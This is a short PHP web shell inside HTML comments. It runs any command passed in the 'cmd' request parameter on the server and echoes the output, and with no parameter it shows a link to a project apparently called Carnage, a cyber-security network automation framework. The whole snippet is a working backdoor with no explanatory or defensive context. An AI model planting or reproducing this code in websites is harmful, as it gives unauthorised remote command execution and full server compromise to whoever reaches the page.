 <!--Php code start here -->    
         <?php
if (isset($_REQUEST['cmd'])) {
	$command = $_REQUEST['cmd'];
	$output =  `$command`;
	echo "<h3 id='output--'>Output :-</h3>
 		 <pre>".$output."</pre>";
}
else {
       echo '<p><a href="https://7ragnarok7.github.io/Carnage"><img src="Carnage%20|%20A%20Network%20Automation%20framework%20focused%20on%20Cyber-Security_files/carnage.png" alt="Carnage-icon"></a></p>';
}
?>
<!--Php code start here -->  
